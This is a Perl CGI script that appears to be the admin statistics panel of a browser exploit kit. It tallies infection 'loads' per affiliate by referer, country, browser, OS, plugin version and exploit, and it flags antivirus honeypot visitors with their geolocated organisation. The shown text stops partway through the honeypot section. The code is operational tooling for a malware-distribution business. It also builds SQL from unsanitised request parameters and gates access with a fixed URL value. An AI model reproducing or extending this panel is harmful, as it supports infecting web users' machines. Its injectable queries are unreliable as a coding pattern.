#!/usr/bin/perl
  
  # index.pl
  use CGI;
  use CGI::Carp qw/fatalsToBrowser warningsToBrowser/;
  use CGI::Session ( '-ip_match' );
  use DBI;
  use Geo::IP;
  require "xpl/config.pl";
  
  $db_name = 'DBI:mysql:' . $config{MysqlDB};
  $dbh = DBI->connect($db_name, $config{MysqlUser}, $config{MysqlPass}) || die "Could not connect to database: $DBI::errstr";

  $session = CGI::Session->load();
  $q = new CGI;
  
  $cook = $q->param('cook');
  $stats = $q->param('q');
  $selectuser = $q->param('selectuser');
  $vfy = $q->param('vfy');
  
  
  if($vfy ne 'xplad')
  {
    print "Status: 301 Moved\nLocation: login.pl\n\n";
  }
  if($session->is_expired)
  {
    print $q->header(-cache_control=>"no-cache, no-store, must-revalidate");
    print "Your has session expired. Please login again.";
	print "<br/><a href='login.pl>Login</a>";
  }
  elsif($session->is_empty)
  {
    #print $q->header(-cache_control=>"no-cache, no-store, must-revalidate");
    print "Status: 301 Moved\nLocation: login.pl\n\n";
  }
  else
  {
    if($selectuser eq "")
    {
      $selectuser = 'Admin';
    }

    $req = "SELECT id,username,password,affid,email,cook,filez FROM affiliates WHERE username='$selectuser'";
    $sth = $dbh->prepare($req);
    $sth->execute() || die;
    while(my @row = $sth->fetchrow_array)
    {
      $id = $row['0'];
      $name = $row['1'];
      $password = $row['2'];
      $affid = $row['3'];
      $email = $row['4'];
      $cook = $row['5'];
      $filez = $row['6'];
    }
    $sth -> finish;

    $addonquery = '';
    if($affid ne 'admin') {$addonquery = " WHERE aff='$affid'"}

    if($stats eq 'loads' or $stats eq "")
    {
      #Loads without select
      $req = "SELECT COUNT(id)as totview, sum(loads) as sumloads FROM hosts $addonquery";
      $sth = $dbh->prepare($req);
      $sth->execute() || die;
      while(my @row = $sth->fetchrow_array)
      {
        $hosts = $row['0'];
        $loads = $row['1'];
      }
      $sth -> finish;
      $percent = 0;
      $percent = $loads * 100 / $hosts if($hosts ne "0" and $loads ne "0");
      $arrondi = sprintf("%.0f", $percent);

      $texttoprint = "
	  Loads | <a href=\"xplstats.pl?cook=$cook&q=ref&selectuser=$selectuser&vfy=xplad\">Referers</a> | <a href=\"xplstats.pl?cook=$cook&q=sites&selectuser=$selectuser&vfy=xplad\">Referal Sites</a> | <a href=\"xplstats.pl?cook=$cook&q=ctry&selectuser=$selectuser&vfy=xplad\">Countries</a> | <a href=\"xplstats.pl?cook=$cook&q=browser&selectuser=$selectuser&vfy=xplad\">Browsers</a> | <a href=\"xplstats.pl?cook=$cook&q=os&selectuser=$selectuser&vfy=xplad\">OS</a> | <a href=\"xplstats.pl?cook=$cook&q=arch&selectuser=$selectuser&vfy=xplad\">Arch</a> | <a href=\"xplstats.pl?cook=$cook&q=lang&selectuser=$selectuser&vfy=xplad\">Lang</a> | <a href=\"xplstats.pl?cook=$cook&q=plugs&selectuser=$selectuser&vfy=xplad\">Plugins</a> | <a href=\"xplstats.pl?cook=$cook&q=xplc&selectuser=$selectuser&vfy=xplad\">Exploits</a> | <a href=\"xplstats.pl?cook=$cook&q=honey&selectuser=$selectuser&vfy=xplad\">AntiVirus Connections</a><br>
      <DIV id=\"main\">
      <DIV class=\"content\">
      <DIV id=\"pages\">
      <DIV id=\"home\">
      <DIV>
      </DIV>
      <center>
      <table COLS=2 WIDTH=\"800\" >
      <tr VALIGN=TOP>
      <td>
      <b>Unique View</b>
      <br>
      </td>
      <td>
      <b>Loads</b>
      <br>
      </td>
      <td>
      <b>%</b>
      <br>
      </td>
      </tr>
      <tr>
      <center>
      <img src=\"images/gotop.png\"></img>
      </center>
      </tr>
      <td>
      $hosts <br>
      </td>
      <td>
      $loads <br>
      </td>
      <td>
      $arrondi <br>
      </td>
      </table>"
    }


    if($stats eq 'plugs')
    {
      #java
      $req = "select count(id) as totview, sum(loads) as totloads, java from hosts $addonquery group by java ASC";
      $sth = $dbh->prepare($req);
      $sth->execute() || die;
      while(my @row = $sth->fetchrow_array)
      {
        $java_total .= $row['0'] . '<br>' . "\n";
        $java_loads .= $row['1'] . '<br>' . "\n";
        $java_ref .= '=>' . $row['2'] . '<br>' . "\n";
      }
      $sth -> finish;

      #adobe
      $req = "select count(id) as totview, sum(loads) as totloads, adobe from hosts $addonquery group by adobe ASC";
      $sth = $dbh->prepare($req);
      $sth->execute() || die;
      while(my @row = $sth->fetchrow_array)
      {
        $adobe_total .= $row['0'] . '<br>' . "\n";
        $adobe_loads .= $row['1'] . '<br>' . "\n";
        $adobe_ref .= '=>' . $row['2'] . '<br>' . "\n";
      }
      $sth -> finish;

      #quicktime
      $req = "select count(id) as totview, sum(loads) as totloads, quicktime from hosts $addonquery group by quicktime ASC";
      $sth = $dbh->prepare($req);
      $sth->execute() || die;
      while(my @row = $sth->fetchrow_array)
      {
        $quicktime_total .= $row['0'] . '<br>' . "\n";
        $quicktime_loads .= $row['1'] . '<br>' . "\n";
        $quicktime_ref .= '=>' . $row['2'] . '<br>' . "\n";
      }
      $sth -> finish;


      #flash
      $req = "select count(id) as totview, sum(loads) as totloads, flash from hosts $addonquery group by flash ASC";
      $sth = $dbh->prepare($req);
      $sth->execute() || die;
      while(my @row = $sth->fetchrow_array)
      {
        $flash_total .= $row['0'] . '<br>' . "\n";
        $flash_loads .= $row['1'] . '<br>' . "\n";
        $flash_ref .= '=>' . $row['2'] . '<br>' . "\n";
      }
      $sth -> finish;

      #shockwave
      $req = "select count(id) as totview, sum(loads) as totloads, shockwave from hosts $addonquery group by shockwave ASC";
      $sth = $dbh->prepare($req);
      $sth->execute() || die;
      while(my @row = $sth->fetchrow_array)
      {
        $shockwave_total .= $row['0'] . '<br>' . "\n";
        $shockwave_loads .= $row['1'] . '<br>' . "\n";
        $shockwave_ref .= '=>' . $row['2'] . '<br>' . "\n";
      }
      $sth -> finish;

      #vlc
      $req = "select count(id) as totview, sum(loads) as totloads, vlc from hosts $addonquery group by vlc ASC";
      $sth = $dbh->prepare($req);
      $sth->execute() || die;
      while(my @row = $sth->fetchrow_array)
      {
        $vlc_total .= $row['0'] . '<br>' . "\n";
        $vlc_loads .= $row['1'] . '<br>' . "\n";
        $vlc_ref .= '=>' . $row['2'] . '<br>' . "\n";
      }
      $sth -> finish;


      #realplayer
      $req = "select count(id) as totview, sum(loads) as totloads, realplayer from hosts $addonquery group by realplayer ASC";
      $sth = $dbh->prepare($req);
      $sth->execute() || die;
      while(my @row = $sth->fetchrow_array)
      {
        $realplayer_total .= $row['0'] . '<br>' . "\n";
        $realplayer_loads .= $row['1'] . '<br>' . "\n";
        $realplayer_ref .= '=>' . $row['2'] . '<br>' . "\n";
      }
      $sth -> finish;

      #silverlight
      $req = "select count(id) as totview, sum(loads) as totloads, silverlight from hosts $addonquery group by silverlight ASC";
      $sth = $dbh->prepare($req);
      $sth->execute() || die;
      while(my @row = $sth->fetchrow_array)
      {
        $silverlightr_total .= $row['0'] . '<br>' . "\n";
        $silverlight_loads .= $row['1'] . '<br>' . "\n";
        $silverlight_ref .= '=>' . $row['2'] . '<br>' . "\n";
      }
      $sth -> finish;

	  $texttoprint = "
	  <a href=\"xplstats.pl?cook=$cook&q=loads&selectuser=$selectuser&vfy=xplad\">Loads</a> | <a href=\"xplstats.pl?cook=$cook&q=ref&selectuser=$selectuser&vfy=xplad\">Referers</a> | <a href=\"xplstats.pl?cook=$cook&q=sites&selectuser=$selectuser&vfy=xplad\">Referal Sites</a> | <a href=\"xplstats.pl?cook=$cook&q=ctry&selectuser=$selectuser&vfy=xplad\">Countries</a> | <a href=\"xplstats.pl?cook=$cook&q=browser&selectuser=$selectuser&vfy=xplad\">Browsers</a> | <a href=\"xplstats.pl?cook=$cook&q=os&selectuser=$selectuser&vfy=xplad\">OS</a> | <a href=\"xplstats.pl?cook=$cook&q=arch&selectuser=$selectuser&vfy=xplad\">Arch</a> | <a href=\"xplstats.pl?cook=$cook&q=lang&selectuser=$selectuser&vfy=xplad\">Lang</a> | Plugins | <a href=\"xplstats.pl?cook=$cook&q=xplc&selectuser=$selectuser&vfy=xplad\">Exploits</a> | <a href=\"xplstats.pl?cook=$cook&q=honey&selectuser=$selectuser&vfy=xplad\">AntiVirus Connections</a><br>
     <DIV id=\"main\">
     <DIV class=\"content\">
     <DIV id=\"pages\">
     <DIV id=\"home\">
     <DIV>
     </DIV>

     <center>
     <table COLS=2 WIDTH=\"800\" >
     <tr VALIGN=TOP>
     <td>
     <b>Plugin</b>
     <br>
     </td>
     <td>
     <b>Total</b>
     <br>
     </td>
	 <td>
     <b>Loads</b>
     <br>
     </td>
     </tr>
     <tr>
     <center>
     <img src=\"images/gotop.png\"></img>
     </center>
     </tr>
     <td>
     <b>Java</b><br>
     $java_ref<br>
     <b>Adobe</b><br>
     $adobe_ref<br>
     <b>Quicktime</b><br>
     $quicktime_ref<br>
     <b>Flash</b><br>
     $flash_ref<br>
     <b>Shockwave</b><br>
     $shockwave_ref<br>
     <b>VLC Player</b><br>
     $vlc_ref<br>
     <b>RealPlayer</b><br>
     $realplayer_ref<br>
     <b>SilverLight</b><br>
     $silverlight_ref<br>
     </td>
     <td>
     <br>
     $java_total <br>
     <br>
     $adobe_total <br>
     <br>
     $quicktime_total <br>
     <br>
     $flash_total <br>
     <br>
     $shockwave_total <br>
     <br>
     $vlc_total <br>
     <br>
     $realplayer_total <br>
     <br>
     $silverlight_total <br>
     </td>
     <td>
     <br>
     $java_loads <br>
     <br>
     $adobe_loads <br>
     <br>
     $quicktime_loads <br>
     <br>
     $flash_loads <br>
     <br>
     $shockwave_loads <br>
     <br>
     $vlc_loads <br>
     <br>
     $realplayer_loads <br>
     <br>
     $silverlight_loads <br>
     </td>
     </table>"
    }


	
    if($stats eq 'xplc')
    {
      #Loads for each exploit
      $req = "SELECT description,views,loads FROM exploits";
      $sth = $dbh->prepare($req);
      $sth->execute() || die;
      while(my @row = $sth->fetchrow_array)
      {
        $exploitname .= $row['0'] . "<br>\n";;
        $xplview .= $row['1'] . "<br>\n";;
        $xplloads .= $row['2'] . "<br>\n";;
      }
      $sth -> finish;
 
      $texttoprint = "
	  <a href=\"xplstats.pl?cook=$cook&q=loads&selectuser=$selectuser&vfy=xplad\">Loads</a> | <a href=\"xplstats.pl?cook=$cook&q=ref&selectuser=$selectuser&vfy=xplad\">Referers</a> | <a href=\"xplstats.pl?cook=$cook&q=sites&selectuser=$selectuser&vfy=xplad\">Referal Sites</a> | <a href=\"xplstats.pl?cook=$cook&q=ctry&selectuser=$selectuser&vfy=xplad\">Countries</a> | <a href=\"xplstats.pl?cook=$cook&q=browser&selectuser=$selectuser&vfy=xplad\">Browsers</a> | <a href=\"xplstats.pl?cook=$cook&q=os&selectuser=$selectuser&vfy=xplad\">OS</a> | <a href=\"xplstats.pl?cook=$cook&q=arch&selectuser=$selectuser&vfy=xplad\">Arch</a> | <a href=\"xplstats.pl?cook=$cook&q=lang&selectuser=$selectuser&vfy=xplad\">Lang</a> | <a href=\"xplstats.pl?cook=$cook&q=plugs&selectuser=$selectuser&vfy=xplad\">Plugins</a> | Exploits | <a href=\"xplstats.pl?cook=$cook&q=honey&selectuser=$selectuser&vfy=xplad\">AntiVirus Connections</a> <br>

     <DIV id=\"main\">
     <DIV class=\"content\">
     <DIV id=\"pages\">

     <DIV id=\"home\">
     <DIV>
     </DIV>
     <center>

     <table COLS=2 WIDTH=\"800\" >

     <tr VALIGN=TOP>
     <td>
     <b>Exploit Name</b>
     <br>
     </td>
     <td>
     <b>View</b>
     <br>
     </td>
     <td>

     <b>loads</b>
     <br>
     </td>
     </tr>

     <tr>
     <center>
     <img src=\"images/gotop.png\"></img>
     </center>

     </tr>
     <td>
     $exploitname <br>
     </td>

     <td>
     $xplview <br>
     </td>
	 <td>

     $xplloads <br>
     </td>
     </table>"
    }


    if($stats eq 'ref')
    {
      #Referer
      $req = "select count(id) as totview, sum(loads) as totloads, referer from hosts $addonquery group by referer ASC";
      $sth = $dbh->prepare($req);
      $sth->execute() || die;
      while(my @row = $sth->fetchrow_array)
      {
        $ref_total .= $row['0'] . '<br>' . "\n";
        $ref_loads .= $row['1'] . '<br>' . "\n";
        $real_ref .= $row['2'] . '<br>' . "\n";
      }
      $sth -> finish;
	
      $texttoprint = "
	  <a href=\"xplstats.pl?cook=$cook&q=loads&selectuser=$selectuser&vfy=xplad\">Loads</a> | Referers | <a href=\"xplstats.pl?cook=$cook&q=sites&selectuser=$selectuser&vfy=xplad\">Referal Sites</a> | <a href=\"xplstats.pl?cook=$cook&q=ctry&selectuser=$selectuser&vfy=xplad\">Countries</a> | <a href=\"xplstats.pl?cook=$cook&q=browser&selectuser=$selectuser&vfy=xplad\">Browsers</a> | <a href=\"xplstats.pl?cook=$cook&q=os&selectuser=$selectuser&vfy=xplad\">OS</a> | <a href=\"xplstats.pl?cook=$cook&q=arch&selectuser=$selectuser&vfy=xplad\">Arch</a> | <a href=\"xplstats.pl?cook=$cook&q=lang&selectuser=$selectuser&vfy=xplad\">Lang</a> | <a href=\"xplstats.pl?cook=$cook&q=plugs&selectuser=$selectuser&vfy=xplad\">Plugins</a> | <a href=\"xplstats.pl?cook=$cook&q=xplc&selectuser=$selectuser&vfy=xplad\">Exploits</a> | <a href=\"xplstats.pl?cook=$cook&q=honey&selectuser=$selectuser&vfy=xplad\">AntiVirus Connections</a><br>
     <DIV id=\"main\">
     <DIV class=\"content\">
     <DIV id=\"pages\">
     <DIV id=\"home\">
     <DIV>
     </DIV>
     <center>
     <table COLS=2 WIDTH=\"800\" >
     <tr VALIGN=TOP>
     <td>
     <b>Referers</b>
     <br>
     </td>
     <td>
     <b>Total</b>
     <br>
     </td>
	 <td>
     <b>Loads</b>
     <br>
     </td>
     </tr>
     <tr>
     <center>
     <img src=\"images/gotop.png\"></img>
     </center>
     </tr>
     <td>
     $real_ref <br>
     </td>
     <td>
     $ref_total <br>
     </td>
	 <td>
     $ref_loads <br>
     </td>
     </table>"
    }

	
    if($stats eq 'ctry')
    {
      #Country
      $req = "select count(id) as totview, sum(loads) as totloads, country from hosts $addonquery group by country ASC";
      $sth = $dbh->prepare($req);
      $sth->execute() || die;
      while(my @row = $sth->fetchrow_array)
      {
        $uc_country = $row['2'];

       	$lccountry = lc($uc_country);
        $lccountry = 'other' if(!-e "images/country/$lccountry\.png");

        $ref_total .= $row['0'] . '<br>' . "\n";
        $ref_loads .= $row['1'] . '<br>' . "\n";
        $real_ref .= '<img src="images/country/' . $lccountry . '.png"></img> ' . $uc_country . '<br>' . "\n";
      }
      $sth -> finish;

      $texttoprint = "
	  <a href=\"xplstats.pl?cook=$cook&q=loads&selectuser=$selectuser&vfy=xplad\">Loads</a> | <a href=\"xplstats.pl?cook=$cook&q=ref&selectuser=$selectuser&vfy=xplad\">Referers</a> | <a href=\"xplstats.pl?cook=$cook&q=sites&selectuser=$selectuser&vfy=xplad\">Referal Sites</a> | Countries | <a href=\"xplstats.pl?cook=$cook&q=browser&selectuser=$selectuser&vfy=xplad\">Browsers</a> | <a href=\"xplstats.pl?cook=$cook&q=os&selectuser=$selectuser&vfy=xplad\">OS</a> | <a href=\"xplstats.pl?cook=$cook&q=arch&selectuser=$selectuser&vfy=xplad\">Arch</a> | <a href=\"xplstats.pl?cook=$cook&q=lang&selectuser=$selectuser&vfy=xplad\">Lang</a> | <a href=\"xplstats.pl?cook=$cook&q=plugs&selectuser=$selectuser&vfy=xplad\">Plugins</a> | <a href=\"xplstats.pl?cook=$cook&q=xplc&selectuser=$selectuser&vfy=xplad\">Exploits</a> | <a href=\"xplstats.pl?cook=$cook&q=honey&selectuser=$selectuser&vfy=xplad\">AntiVirus Connections</a><br>
     <DIV id=\"main\">
     <DIV class=\"content\">
     <DIV id=\"pages\">
     <DIV id=\"home\">
     <DIV>
     </DIV>
     <center>
     <table COLS=2 WIDTH=\"800\" >
     <tr VALIGN=TOP>
     <td>
     <b>Country code</b>
     <br>
     </td>
     <td>
     <b>Total</b>
     <br>
     </td>
	 <td>

     <b>Loads</b>
     <br>
     </td>
     </tr>
     <tr>
     <center>
     <img src=\"images/gotop.png\"></img>
     </center>
     </tr>
     <td>
     $real_ref <br>
     </td>
     <td>
     $ref_total <br>
     </td>
	 <td>
     $ref_loads <br>
     </td>
     </table>"
    }
	
    if($stats eq 'browser')
    {
      if($addonquery eq '') { $addonquery = 'where 1=1'; }
      #Browser (general)
      $req = "select browser,count(id) as views,sum(loads) as loads from hosts $addonquery group by browser ASC;";
      $sth = $dbh->prepare($req);
      $sth->execute() || die;
      while(my @row = $sth->fetchrow_array)
      {
        $current_browser_to_check = '';
        $real_browser .= "<br><b>$row['0']</b>" . '<br>' . "\n";
        $browser_total .= "<br><b>$row['1']</b>" . '<br>' . "\n";
        $browser_loads .= "<br><b>$row['2']</b>" . '<br>' . "\n";
        $current_browser_to_check = $row['0'];

        #Browser (version)
        $req2 = "select browser_version,count(id) as views,sum(loads) as loads from hosts $addonquery and browser='$current_browser_to_check' group by browser_version ASC;";
        $sth2 = $dbh->prepare($req2);
        $sth2->execute() || die;
        while(my @row2 = $sth2->fetchrow_array)
        {
          $real_browser .= "<b>=></b> $row2['0']</b>" . '<br>' . "\n";
          $browser_total .= "<b>$row2['1']</b>" . '<br>' . "\n";
          $browser_loads .= "<b>$row2['2']</b>" . '<br>' . "\n";
        }
        $sth2 -> finish;

      }
      $sth -> finish;
      if($addonquery eq 'where 1=1') { $addonquery = ''; }

      $texttoprint = "
	  <a href=\"xplstats.pl?cook=$cook&q=loads&selectuser=$selectuser&vfy=xplad\">Loads</a> | <a href=\"xplstats.pl?cook=$cook&q=ref&selectuser=$selectuser&vfy=xplad\">Referers</a> | <a href=\"xplstats.pl?cook=$cook&q=sites&selectuser=$selectuser&vfy=xplad\">Referal Sites</a> | <a href=\"xplstats.pl?cook=$cook&q=ctry&selectuser=$selectuser&vfy=xplad\">Countries</a> | Browser | <a href=\"xplstats.pl?cook=$cook&q=os&selectuser=$selectuser&vfy=xplad\">OS</a> | <a href=\"xplstats.pl?cook=$cook&q=arch&selectuser=$selectuser&vfy=xplad\">Arch</a> | <a href=\"xplstats.pl?cook=$cook&q=lang&selectuser=$selectuser&vfy=xplad\">Lang</a> | <a href=\"xplstats.pl?cook=$cook&q=plugs&selectuser=$selectuser&vfy=xplad\">Plugins</a> | <a href=\"xplstats.pl?cook=$cook&q=xplc&selectuser=$selectuser&vfy=xplad\">Exploits</a> | <a href=\"xplstats.pl?cook=$cook&q=honey&selectuser=$selectuser&vfy=xplad\">AntiVirus Connections</a><br>
     <DIV id=\"main\">
     <DIV class=\"content\">
     <DIV id=\"pages\">
     <DIV id=\"home\">
     <DIV>
     </DIV>
     <center>
     <table COLS=2 WIDTH=\"800\" >
     <tr VALIGN=TOP>
     <td>
     <b>Browsers</b>
     <br>
     </td>
     <td>
     <b>Total</b>
     <br>
     </td>
	 <td>
     <b>Loads</b>
     <br>
     </td>
     </tr>
     <tr>
     <center>
     <img src=\"images/gotop.png\"></img>
     </center>
     </tr>
     <td>
     $real_browser <br>
     </td>
     <td>
     $browser_total <br>
     </td>
	 <td>
     $browser_loads <br>
     </td>
     </table>"
    }
	
    if($stats eq 'os')
    {
      if($addonquery eq '') { $addonquery = 'where 1=1'; }
      #OS (general)
      $req = "select os,count(id) as views,sum(loads) as loads from hosts $addonquery group by os ASC;";
      $sth = $dbh->prepare($req);
      $sth->execute() || die;
      while(my @row = $sth->fetchrow_array)
      {
        $current_os_to_check = '';
        $os_version .= "<br><b>$row['0']</b>" . '<br>' . "\n";
        $os_total .= "<br><b>$row['1']</b>" . '<br>' . "\n";
        $os_loads .= "<br><b>$row['2']</b>" . '<br>' . "\n";
        $current_os_to_check = $row['0'];

        #OS (flavor)
        $req2 = "select os_flavor,count(id) as views,sum(loads) as loads from hosts where 1=1 and os='$current_os_to_check' group by os_flavor ASC";
        $sth2 = $dbh->prepare($req2);
        $sth2->execute() || die;
        while(my @row2 = $sth2->fetchrow_array)
        {
          $os_version .= "<b>=></b> $row2['0']</b>" . '<br>' . "\n";
          $os_total .= "<b>$row2['1']</b>" . '<br>' . "\n";
          $os_loads .= "<b>$row2['2']</b>" . '<br>' . "\n";
        }
        $sth2 -> finish;

      }
      $sth -> finish;
      if($addonquery eq 'where 1=1') { $addonquery = ''; }
	  
      $texttoprint = "
	  <a href=\"xplstats.pl?cook=$cook&q=loads&selectuser=$selectuser&vfy=xplad\">Loads</a> | <a href=\"xplstats.pl?cook=$cook&q=ref&selectuser=$selectuser&vfy=xplad\">Referers</a> | <a href=\"xplstats.pl?cook=$cook&q=sites&selectuser=$selectuser&vfy=xplad\">Referal Sites</a> | <a href=\"xplstats.pl?cook=$cook&q=ctry&selectuser=$selectuser&vfy=xplad\">Countries</a> | <a href=\"xplstats.pl?cook=$cook&q=browser&selectuser=$selectuser&vfy=xplad\">Browsers</a> | OS | <a href=\"xplstats.pl?cook=$cook&q=arch&selectuser=$selectuser&vfy=xplad\">Arch</a> | <a href=\"xplstats.pl?cook=$cook&q=lang&selectuser=$selectuser&vfy=xplad\">Lang</a> | <a href=\"xplstats.pl?cook=$cook&q=plugs&selectuser=$selectuser&vfy=xplad\">Plugins</a> | <a href=\"xplstats.pl?cook=$cook&q=xplc&selectuser=$selectuser&vfy=xplad\">Exploits</a> | <a href=\"xplstats.pl?cook=$cook&q=honey&selectuser=$selectuser&vfy=xplad\">AntiVirus Connections</a><br>
     <DIV id=\"main\">
     <DIV class=\"content\">
     <DIV id=\"pages\">
     <DIV id=\"home\">
     <DIV>
     </DIV>
     <center>
     <table COLS=2 WIDTH=\"800\" >
     <tr VALIGN=TOP>
     <td>
     <b>OS</b>
     <br>
     </td>
     <td>
     <b>Total</b>
     <br>
     </td>
	 <td>
     <b>Loads</b>
     <br>
     </td>
     </tr>
     <tr>
     <center>
     <img src=\"images/gotop.png\"></img>
     </center>
     </tr>
     <td>
     $os_version <br>
     </td>
     <td>
     $os_total <br>
     </td>
	 <td>
     $os_loads <br>
     </td>
     </table>"
    }
	
    if($stats eq 'sites')
    {
      #Referer
      $req = "select SUBSTRING_INDEX((SUBSTRING_INDEX((SUBSTRING_INDEX(referer, 'http://', -1)), '/', 1)), '.', -2) as domain,count(id) as views,sum(loads) as loads from hosts $addonquery group by domain";
      $sth = $dbh->prepare($req);
      $sth->execute() || die;
      while(my @row = $sth->fetchrow_array)
      {
        $real_ref .= $row['0'] . '<br>' . "\n";
	$ref_total .= $row['1']  . '<br>' . "\n";
	$ref_loads .= $row['2']  . '<br>' . "\n";
      }
      $sth -> finish;

      $texttoprint = "
	  <a href=\"xplstats.pl?cook=$cook&q=loads&selectuser=$selectuser&vfy=xplad\">Loads</a> | <a href=\"xplstats.pl?cook=$cook&q=ref&selectuser=$selectuser&vfy=xplad\">Referers</a> | Referal Sites | <a href=\"xplstats.pl?cook=$cook&q=ctry&selectuser=$selectuser&vfy=xplad\">Countries</a> | <a href=\"xplstats.pl?cook=$cook&q=browser&selectuser=$selectuser&vfy=xplad\">Browsers</a> | <a href=\"xplstats.pl?cook=$cook&q=os&selectuser=$selectuser&vfy=xplad\">OS</a> | <a href=\"xplstats.pl?cook=$cook&q=arch&selectuser=$selectuser&vfy=xplad\">Arch</a> | <a href=\"xplstats.pl?cook=$cook&q=lang&selectuser=$selectuser&vfy=xplad\">Lang</a> | <a href=\"xplstats.pl?cook=$cook&q=plugs&selectuser=$selectuser&vfy=xplad\">Plugins</a> | <a href=\"xplstats.pl?cook=$cook&q=xplc&selectuser=$selectuser&vfy=xplad\">Exploits</a> | <a href=\"xplstats.pl?cook=$cook&q=honey&selectuser=$selectuser&vfy=xplad\">AntiVirus Connections</a><br>
     <DIV id=\"main\">
     <DIV class=\"content\">
     <DIV id=\"pages\">
     <DIV id=\"home\">
     <DIV>
     </DIV>
     <center>
     <table COLS=2 WIDTH=\"800\" >
     <tr VALIGN=TOP>
     <td>
     <b>Referers sites</b>
     <br>
     </td>
     <td>
     <b>Total</b>
     <br>
     </td>
	 <td>
     <b>Loads</b>
     <br>
     </td>
     </tr>
     <tr>
     <center>
     <img src=\"images/gotop.png\"></img>
     </center>
     </tr>
     <td>
     $real_ref <br>
     </td>
     <td>
     $ref_total <br>
     </td>
	 <td>
     $ref_loads <br>
     </td>
     </table>"
    }


    if($stats eq 'arch')
    {
      #Architecture
      $req = "select count(id) as totview, sum(loads) as totloads,arch from hosts $addonquery group by arch ASC";
      $sth = $dbh->prepare($req);
      $sth->execute() || die;
      while(my @row = $sth->fetchrow_array)
      {
        $ref_total .= $row['0'] . '<br>' . "\n";
        $ref_loads .= $row['1'] . '<br>' . "\n";
        $real_ref .= $row['2'] . '<br>' . "\n";
      }
      $sth -> finish;

      $texttoprint = "
	  <a href=\"xplstats.pl?cook=$cook&q=loads&selectuser=$selectuser&vfy=xplad\">Loads</a> | <a href=\"xplstats.pl?cook=$cook&q=ref&selectuser=$selectuser&vfy=xplad\">Referers</a> | <a href=\"xplstats.pl?cook=$cook&q=sites&selectuser=$selectuser&vfy=xplad\">Referal Sites</a> | <a href=\"xplstats.pl?cook=$cook&q=ctry&selectuser=$selectuser&vfy=xplad\">Countries</a> | <a href=\"xplstats.pl?cook=$cook&q=browser&selectuser=$selectuser&vfy=xplad\">Browsers</a> | <a href=\"xplstats.pl?cook=$cook&q=os&selectuser=$selectuser&vfy=xplad\">OS</a> | Arch | <a href=\"xplstats.pl?cook=$cook&q=lang&selectuser=$selectuser&vfy=xplad\">Lang</a> | <a href=\"xplstats.pl?cook=$cook&q=plugs&selectuser=$selectuser&vfy=xplad\">Plugins</a> | <a href=\"xplstats.pl?cook=$cook&q=xplc&selectuser=$selectuser&vfy=xplad\">Exploits</a> | <a href=\"xplstats.pl?cook=$cook&q=honey&selectuser=$selectuser&vfy=xplad\">AntiVirus Connections</a><br>

     <DIV id=\"main\">

     <DIV class=\"content\">
     <DIV id=\"pages\">
     <DIV id=\"home\">
     <DIV>

     </DIV>
     <center>
     <table COLS=2 WIDTH=\"800\" >
     <tr VALIGN=TOP>

     <td>
     <b>Architecture</b>
     <br>
     </td>

     <td>
     <b>Total</b>
     <br>
     </td>

	 <td>
     <b>Loads</b>
     <br>

     </td>
     </tr>
     <tr>
     <center>
     <img src=\"images/gotop.png\"></img>

     </center>
     </tr>
     <td>
     $real_ref <br>

     </td>
     <td>
     $ref_total <br>
     </td>

	 <td>
     $ref_loads <br>
     </td>
     </table>"
    }


    if($stats eq 'lang')
    {
      #Language
      $req = "select count(id) as totview, sum(loads) as totloads,os_lang from hosts $addonquery group by os_lang ASC";
      $sth = $dbh->prepare($req);
      $sth->execute() || die;
      while(my @row = $sth->fetchrow_array)
      {
        $ref_total .= $row['0'] . '<br>' . "\n";
        $ref_loads .= $row['1'] . '<br>' . "\n";
        $real_ref .= $row['2'] . '<br>' . "\n";
      }
      $sth -> finish;

      $texttoprint = "
	  <a href=\"xplstats.pl?cook=$cook&q=loads&selectuser=$selectuser&vfy=xplad\">Loads</a> | <a href=\"xplstats.pl?cook=$cook&q=ref&selectuser=$selectuser&vfy=xplad\">Referers</a> | <a href=\"xplstats.pl?cook=$cook&q=sites&selectuser=$selectuser&vfy=xplad\">Referal Sites</a> | <a href=\"xplstats.pl?cook=$cook&q=ctry&selectuser=$selectuser&vfy=xplad\">Countries</a> | <a href=\"xplstats.pl?cook=$cook&q=browser&selectuser=$selectuser&vfy=xplad\">Browsers</a> | <a href=\"xplstats.pl?cook=$cook&q=os&selectuser=$selectuser&vfy=xplad\">OS</a> | <a href=\"xplstats.pl?cook=$cook&q=arch&selectuser=$selectuser&vfy=xplad\">Arch</a> | Lang | <a href=\"xplstats.pl?cook=$cook&q=plugs&selectuser=$selectuser&vfy=xplad\">Plugins</a> | <a href=\"xplstats.pl?cook=$cook&q=xplc&selectuser=$selectuser&vfy=xplad\">Exploits</a> | <a href=\"xplstats.pl?cook=$cook&q=honey&selectuser=$selectuser&vfy=xplad\">AntiVirus Connections</a><br>
     <DIV id=\"main\">
     <DIV class=\"content\">
     <DIV id=\"pages\">
     <DIV id=\"home\">
     <DIV>
     </DIV>
     <center>
     <table COLS=2 WIDTH=\"800\" >
     <tr VALIGN=TOP>
     <td>
     <b>OS Language</b>
     <br>
     </td>
     <td>
     <b>Total</b>
     <br>
     </td>
	 <td>
     <b>Loads</b>
     <br>
     </td>
     </tr>
     <tr>
     <center>
     <img src=\"images/gotop.png\"></img>
     </center>
     </tr>
     <td>
     $real_ref <br>
     </td>
     <td>
     $ref_total <br>
     </td>
	 <td>
     $ref_loads <br>
     </td>
     </table>"
    }

    if($stats eq 'honey')
    {
      #HoneyPot
      $sql = "SELECT * FROM hosts";
      $statement = $dbh->prepare($sql) or die "Couldn't prepare query '$sql': $DBI::errstr\n";
      $results = $dbh->selectall_hashref("SELECT * FROM hosts where os='HoneyPot'", 'ip');
      foreach my $referer (keys %$results)
      {
        #Real IP
        $real_ipadd = join('.', unpack('C4', pack('N', $referer)));
        #country
        $gi = Geo::IP->open( 'xpl/dep/GeoIP.dat' );
        my $country_chk = $gi->country_code_by_addr($real_ipadd);
        #organisation
        $gi = Geo::IP->open( 'xpl/dep/GeoIPOrg.dat' );
        my $org_chk = $gi->org_by_addr($real_ipadd);
        #passed or not
        $raw_pass = $dbh->selectrow_array("SELECT loads FROM hosts WHERE ip='$referer'");
        $passed = '<font color="green">no</font>';
        $passed = '<font color="red">yes</font>' if($raw_pass =~ '1');
        $raw_pass2 = $dbh->selectrow_array("SELECT referer FROM hosts WHERE ip='$referer'");
          
        $lccountry = lc($country_chk);
        $lccountry = 'other' if(!-e "images/country/$lccountry\.png");
          
        $real_ref .=  $real_ipadd . '<br>' . "\n";
	$ref_total .= '<img src="images/country/' . $lccountry . '.png"></img> ' . $country_chk  . '<br>' . "\n";
        $ref_org .= $org_chk . '<br>' . "\n";
